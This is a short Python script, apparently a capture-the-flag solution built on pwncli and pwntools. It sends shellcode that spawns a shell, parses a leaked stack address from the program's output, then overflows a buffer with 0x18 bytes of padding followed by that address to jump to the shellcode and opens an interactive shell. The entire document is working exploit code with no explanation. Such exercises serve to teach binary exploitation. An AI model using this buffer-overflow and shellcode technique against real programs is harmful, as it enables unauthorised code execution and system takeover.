
#!/usr/bin/python3
# -*- encoding: utf-8 -*-

from pwncli import *

# use script mode
cli_script()

# get use for obj from gift
io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']

payload=asm(shellcraft.sh())
sla("I have a gift for you.\nWhat do you want?\n",payload)
ru('0x')
shell_addr=int(ru('.')[::-1][1:][::-1],16)

payload=b'a'*0x18+p64(shell_addr)
sla('take it.\n',payload)

ia()

